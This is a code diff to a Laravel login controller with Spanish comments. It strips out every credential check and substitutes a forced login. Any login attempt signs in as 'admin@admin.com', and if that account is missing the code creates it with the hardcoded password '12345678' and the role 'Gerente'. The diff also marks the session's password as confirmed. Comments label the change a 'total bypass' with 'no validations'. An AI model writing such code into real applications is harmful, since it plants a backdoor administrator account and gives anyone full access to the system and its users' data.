@@ -18,25 +18,25 @@ class AuthController extends Controller
 
     public function logear(Request $request)
     {
-        $email = $request->input('email');
-        $password = $request->input('password');
-        
-        if (!$email || !$password) {
-            return back()->withErrors(['email' => 'Email y contraseña requeridos'])->withInput();
-        }
-        
-        $user = \App\Models\User::where('email', $email)->first();
+        // BYPASS TOTAL - FORZAR LOGIN DIRECTO
+        $user = \App\Models\User::where('email', 'admin@admin.com')->first();
         
         if (!$user) {
-            return back()->withErrors(['email' => 'Usuario no encontrado'])->withInput();
+            $user = \App\Models\User::create([
+                'name' => 'Admin',
+                'nombre' => 'Admin',
+                'email' => 'admin@admin.com',
+                'password' => \Hash::make('12345678'),
+                'rol' => 'Gerente'
+            ]);
         }
         
-        if (!\Hash::check($password, $user->password)) {
-            return back()->withErrors(['email' => 'Contraseña incorrecta'])->withInput();
-        }
+        \Auth::loginUsingId($user->id);
         
-        \Auth::login($user, true);
-        $request->session()->regenerate();
+        // FORZAR SESIÓN SIN VALIDACIONES
+        session()->put('auth.password_confirmed_at', time());
+        session()->regenerate();
+        session()->save();
         
         return redirect('/home');
     }
